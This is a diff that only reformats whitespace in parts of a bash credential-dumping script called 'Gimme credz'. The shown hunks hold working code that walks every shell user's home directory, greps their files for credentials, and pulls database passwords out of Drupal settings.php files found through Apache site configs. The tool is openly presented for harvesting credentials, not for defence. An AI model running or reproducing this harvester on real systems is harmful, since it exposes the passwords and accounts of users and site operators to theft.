@@ -1,6 +1,6 @@
 #! /bin/bash
 # If there is a will, there is a way
-#                        0xMitsurugi
+#			0xMitsurugi
 # v0.0.4
 
 ############## Credz dumper ##############################
@@ -9,9 +9,9 @@
 
 # Defaults vars
 ROOT=0    #If set to 1, we'll try to get files usually owned by root
-          #will produce errors, but could eventually get some things
+	  #will produce errors, but could eventually get some things
 TAR=0     #should we copy and save files for later use 0: no, 1: yes
-          #under planning
+	  #under planning
 VERBOSE=0 #should we print failed checks? 1 yes, 0 no
 
 ##########################################################
@@ -28,8 +28,8 @@ _grep_file() {
 	ROOT=$(_check_root)
 	if [ $ROOT == "yes" ]; then
 		for userhome in $(grep -E "/bin/(ba|z)?sh" /etc/passwd | cut -d ":" -f6 )
-		        do
-			        _grep_file_user "$name" "$userhome" "$file" "$pattern"
+			do
+				_grep_file_user "$name" "$userhome" "$file" "$pattern"
 			done
 	else
 		_grep_file_user "$name" $HOME "$file" "$pattern"
@@ -115,10 +115,10 @@ _grep_file_user() {
 		DATA=$(grep $pattern ${home}/${file})
 		if [ $SOMETHING -eq 1 ]; then
 		       echo -n ""
-	        else
+		else
 		       _dump_name "$name credz [$home]"
 		       _print_win "${home}/${file}" "$DATA"
-	        fi
+		fi
 	else
 		[ $VERBOSE -eq 1 ] && _dump_name "$name credz [$home]"
 		_print_lose "${home}/${file}" "no access to file"
@@ -267,32 +267,32 @@ _dump_wordpress() {
 _dump_drupal() {
 	#And now drupal
 	#Maybe use same code with wordpress?
-        if [ -d /etc/apache2/sites-available/ ]; then
-                for site in /etc/apache2/sites-available/*
-                do
-                        #This regex avoids comments
-                        #Are we sure we have one and only one DocumentRoot in conf file?
-                        DOCROOT=$(grep 'DocumentRoot /' $site | grep -E -v "\w*#" | cut -d ' ' -f2)
+	if [ -d /etc/apache2/sites-available/ ]; then
+		for site in /etc/apache2/sites-available/*
+		do
+			#This regex avoids comments
+			#Are we sure we have one and only one DocumentRoot in conf file?
+			DOCROOT=$(grep 'DocumentRoot /' $site | grep -E -v "\w*#" | cut -d ' ' -f2)
 			OLDIFS=$IFS
 			IFS=$'\n'
-                        DRUPALCONF=$(find $DOCROOT/ -maxdepth 5 -name "settings.php*")
-                        if [ ${#DRUPALCONF} -gt 1 ]; then
+			DRUPALCONF=$(find $DOCROOT/ -maxdepth 5 -name "settings.php*")
+			if [ ${#DRUPALCONF} -gt 1 ]; then
 				for drupalconf in $DRUPALCONF
 				do
-	                                #Sometimes we have other credz in settings.php?
-        	                        CREDZ=$(grep -E -v "\w*\*" $drupalconf | grep -B4 -A1 "password' =>" )
+					#Sometimes we have other credz in settings.php?
+					CREDZ=$(grep -E -v "\w*\*" $drupalconf | grep -B4 -A1 "password' =>" )
 					if [ ${#CREDZ} -gt 1 ]; then
-		                                _dump_name "Drupal config file"
-		                                _print_win "$drupalconf" "$CREDZ"
+						_dump_name "Drupal config file"
+						_print_win "$drupalconf" "$CREDZ"
 					fi
 				done
-                        else
-                                [ $VERBOSE -eq 1 ] && _dump_name "Drupal config file"
-                                _print_lose "$DOCROOT" "No drupal settings.php found"
-                        fi
+			else
+				[ $VERBOSE -eq 1 ] && _dump_name "Drupal config file"
+				_print_lose "$DOCROOT" "No drupal settings.php found"
+			fi
 			IFS=$OLDIFS
-                done
-        fi
+		done
+	fi
 
 }
 
@@ -347,13 +347,13 @@ WHITE=$(echo -en '\033[01;37m')
 
 _banner () {
 	echo ${RED}"#####################################################"${RESTORE}
-	echo ${RED}"#"${RESTORE}"                  Gimme credz !!!"
+	echo ${RED}"#"${RESTORE}"		  Gimme credz !!!"
 	echo ${RED}"#####################################################"${RESTORE}
 	#echo "One-file bash-only script"
 	#echo "Harvest all known credz at once"
 	#echo
-	echo ${RED}"#"${RESTORE}"                              The name's 0xMitsurugi"
-	echo ${RED}"#"${RESTORE}"                                        Remember it!"
+	echo ${RED}"#"${RESTORE}"			      The name's 0xMitsurugi"
+	echo ${RED}"#"${RESTORE}"					Remember it!"
 	echo ${RED}"#####################################################"${RESTORE}
 }
 
